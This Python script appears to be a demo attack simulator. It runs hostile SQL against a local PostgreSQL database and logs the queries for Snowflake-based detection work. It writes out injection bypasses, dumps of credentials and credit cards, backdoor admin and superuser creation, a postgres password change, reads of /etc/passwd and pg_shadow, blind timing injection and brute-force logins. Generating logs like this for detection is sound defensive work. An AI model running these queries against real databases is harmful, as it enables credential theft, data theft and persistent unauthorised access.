#!/usr/bin/env python3
"""
PostgreSQL Attack Simulator

Runs realistic attack patterns against the local PostgreSQL database.
All queries get logged for ingestion to Snowflake.

Attack categories simulated:
1. SQL Injection attempts
2. Privilege escalation attempts
3. Data exfiltration attempts
4. Reconnaissance queries
5. Timing attacks
6. Brute force login patterns

Usage:
    pixi run pg-attacks
"""

import psycopg2
import time
import random
import sys
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table

console = Console()

# Database connection
DB_CONFIG = {
    "dbname": "demo_app",
    "host": "localhost",
    "port": 5432
}


class AttackSimulator:
    """Simulates various attack patterns against PostgreSQL."""
    
    def __init__(self):
        self.conn = None
        self.attack_log = []
        
    def connect(self):
        """Connect to PostgreSQL."""
        try:
            self.conn = psycopg2.connect(**DB_CONFIG)
            self.conn.autocommit = True  # Each query runs independently
            console.print("[green]✓ Connected to PostgreSQL[/green]")
            return True
        except Exception as e:
            console.print(f"[red]✗ Connection failed: {e}[/red]")
            console.print("[yellow]  Hint: Run 'pixi run pg-start' first[/yellow]")
            return False
    
    def execute_attack(self, query: str, attack_type: str, description: str) -> bool:
        """Execute an attack query and log the result."""
        cursor = self.conn.cursor()
        success = False
        error_msg = None
        
        try:
            cursor.execute(query)
            success = True
            try:
                results = cursor.fetchall()
                row_count = len(results)
            except:
                row_count = cursor.rowcount
        except Exception as e:
            error_msg = str(e)[:100]
            row_count = 0
        finally:
            cursor.close()
        
        self.attack_log.append({
            "timestamp": datetime.now().isoformat(),
            "attack_type": attack_type,
            "description": description,
            "query": query[:200],
            "success": success,
            "error": error_msg,
            "rows_affected": row_count
        })
        
        return success
    
    def run_sql_injection_attacks(self):
        """SQL Injection attack patterns."""
        console.print("\n[bold red]🔓 SQL Injection Attacks[/bold red]")
        
        attacks = [
            ("SELECT * FROM users WHERE username = '' OR '1'='1'", 
             "Classic OR bypass"),
            ("SELECT * FROM users WHERE username = 'admin'--'",
             "Comment-based bypass"),
            ("SELECT * FROM users WHERE id = 1 UNION SELECT username, password_hash, email, role, NULL, NULL, NULL, NULL FROM users",
             "UNION-based extraction"),
            ("SELECT * FROM products WHERE name = '' UNION SELECT NULL, card_number_encrypted, NULL, NULL, NULL, NULL FROM credit_cards--",
             "Credit card extraction"),
            ("SELECT * FROM users WHERE username = 'x'; INSERT INTO users(username,role) VALUES('pwned','admin');--",
             "Stacked query injection"),
        ]
        
        for query, desc in attacks:
            time.sleep(random.uniform(0.3, 1.0))
            success = self.execute_attack(query, "sql_injection", desc)
            status = "[green]✓[/green]" if success else "[red]✗[/red]"
            console.print(f"  {status} {desc}")
    
    def run_privilege_escalation(self):
        """Privilege escalation attempts."""
        console.print("\n[bold red]👑 Privilege Escalation Attempts[/bold red]")
        
        attacks = [
            ("UPDATE users SET role = 'admin' WHERE username = 'john_doe'",
             "Elevate regular user to admin"),
            ("INSERT INTO users (username, email, role) VALUES ('backdoor_admin', 'evil@hacker.com', 'admin')",
             "Create backdoor admin account"),
            ("CREATE USER malicious_superuser WITH SUPERUSER PASSWORD 'hackme123'",
             "Create superuser account"),
            ("GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO public",
             "Grant public access to all tables"),
            ("ALTER ROLE postgres WITH PASSWORD 'compromised'",
             "Change postgres password"),
        ]
        
        for query, desc in attacks:
            time.sleep(random.uniform(0.3, 1.0))
            success = self.execute_attack(query, "privilege_escalation", desc)
            status = "[green]✓[/green]" if success else "[red]✗[/red]"
            console.print(f"  {status} {desc}")
    
    def run_data_exfiltration(self):
        """Data exfiltration attempts."""
        console.print("\n[bold red]📤 Data Exfiltration Attempts[/bold red]")
        
        attacks = [
            ("SELECT username, password_hash, email, role FROM users",
             "Dump all user credentials"),
            ("SELECT * FROM credit_cards",
             "Dump credit card data"),
            ("SELECT string_agg(username || ':' || password_hash, E'\\n') FROM users",
             "Extract credentials as string"),
            ("COPY (SELECT * FROM users) TO '/tmp/users_exfil.csv' WITH CSV HEADER",
             "Export users to file"),
            ("SELECT lo_import('/etc/passwd')",
             "Read system file via large object"),
        ]
        
        for query, desc in attacks:
            time.sleep(random.uniform(0.3, 1.0))
            success = self.execute_attack(query, "data_exfiltration", desc)
            status = "[green]✓[/green]" if success else "[red]✗[/red]"
            console.print(f"  {status} {desc}")
    
    def run_reconnaissance(self):
        """Information gathering queries."""
        console.print("\n[bold yellow]🔍 Reconnaissance Queries[/bold yellow]")
        
        attacks = [
            ("SELECT version()",
             "Get PostgreSQL version"),
            ("SELECT current_user, current_database(), inet_server_addr()",
             "Get connection info"),
            ("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'",
             "Enumerate tables"),
            ("SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users'",
             "Enumerate users table columns"),
            ("SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'credit_cards'",
             "Enumerate credit_cards columns"),
            ("SELECT * FROM pg_stat_activity",
             "View active connections"),
            ("SELECT rolname, rolsuper, rolcreatedb FROM pg_roles",
             "Enumerate database roles"),
            ("SELECT usename, passwd FROM pg_shadow",
             "Attempt to read password hashes"),
        ]
        
        for query, desc in attacks:
            time.sleep(random.uniform(0.2, 0.5))
            success = self.execute_attack(query, "reconnaissance", desc)
            status = "[green]✓[/green]" if success else "[red]✗[/red]"
            console.print(f"  {status} {desc}")
    
    def run_timing_attacks(self):
        """Timing-based attacks."""
        console.print("\n[bold magenta]⏱️  Timing Attacks[/bold magenta]")
        
        attacks = [
            ("SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE role='admin') > 0 THEN pg_sleep(1) ELSE pg_sleep(0) END",
             "Check if admin exists via timing"),
            ("SELECT CASE WHEN (SELECT length(password_hash) FROM users WHERE username='admin') > 10 THEN pg_sleep(1) END",
             "Probe password hash length"),
            ("SELECT * FROM users WHERE username = 'admin' AND (SELECT pg_sleep(2)) IS NOT NULL",
             "Delay-based blind injection"),
        ]
        
        for query, desc in attacks:
            console.print(f"  [dim]Running: {desc}...[/dim]")
            success = self.execute_attack(query, "timing_attack", desc)
            status = "[green]✓[/green]" if success else "[red]✗[/red]"
            console.print(f"  {status} {desc}")
    
    def run_brute_force_simulation(self):
        """Simulate brute force login attempts."""
        console.print("\n[bold red]🔐 Brute Force Login Simulation[/bold red]")
        
        users = ["admin", "root", "administrator", "superuser", "postgres"]
        passwords = ["password", "123456", "admin", "root", "letmein", "qwerty"]
        
        for user in users:
            for passwd in passwords[:3]:  # Limit attempts
                query = f"SELECT * FROM users WHERE username = '{user}' AND password_hash = crypt('{passwd}', password_hash)"
                desc = f"Login attempt: {user}/{passwd}"
                time.sleep(random.uniform(0.1, 0.3))
                self.execute_attack(query, "brute_force", desc)
            console.print(f"  [red]✗[/red] Failed login attempts for: {user}")
    
    def run_all_attacks(self):
        """Run all attack simulations."""
        if not self.connect():
            return
        
        console.print(Panel.fit(
            "[bold]PostgreSQL Attack Simulation[/bold]\n"
            "All queries will be logged for Snowflake ingestion",
            title="🎯 Attack Simulator",
            border_style="red"
        ))
        
        # Run different attack types
        self.run_reconnaissance()
        self.run_sql_injection_attacks()
        self.run_brute_force_simulation()
        self.run_data_exfiltration()
        self.run_privilege_escalation()
        self.run_timing_attacks()
        
        # Summary
        self.print_summary()
        
        self.conn.close()
    
    def print_summary(self):
        """Print attack summary."""
        console.print("\n" + "="*60)
        console.print("[bold]Attack Simulation Summary[/bold]")
        console.print("="*60)
        
        # Count by type
        by_type = {}
        for attack in self.attack_log:
            t = attack["attack_type"]
            if t not in by_type:
                by_type[t] = {"total": 0, "success": 0}
            by_type[t]["total"] += 1
            if attack["success"]:
                by_type[t]["success"] += 1
        
        table = Table(title="Attack Statistics")
        table.add_column("Attack Type", style="cyan")
        table.add_column("Total", style="white")
        table.add_column("Successful", style="green")
        table.add_column("Blocked", style="red")
        
        for attack_type, stats in by_type.items():
            blocked = stats["total"] - stats["success"]
            table.add_row(
                attack_type.replace("_", " ").title(),
                str(stats["total"]),
                str(stats["success"]),
                str(blocked)
            )
        
        console.print(table)
        console.print()
        console.print(f"[bold]Total attacks executed:[/bold] {len(self.attack_log)}")
        console.print()
        console.print("[cyan]📝 All queries logged to PostgreSQL logs[/cyan]")
        console.print("[cyan]📁 Check: logs/postgresql-*.csv[/cyan]")
        console.print("[cyan]❄️  Upload to Snowflake: pixi run upload-csv[/cyan]")


def main():
    console.print("[bold cyan]" + "="*60 + "[/bold cyan]")
    console.print("[bold cyan]🔓 PostgreSQL Attack Simulator[/bold cyan]")
    console.print("[bold cyan]" + "="*60 + "[/bold cyan]")
    console.print()
    console.print("[yellow]⚠️  For demo/testing purposes only![/yellow]")
    console.print()
    
    simulator = AttackSimulator()
    simulator.run_all_attacks()


if __name__ == "__main__":
    main()

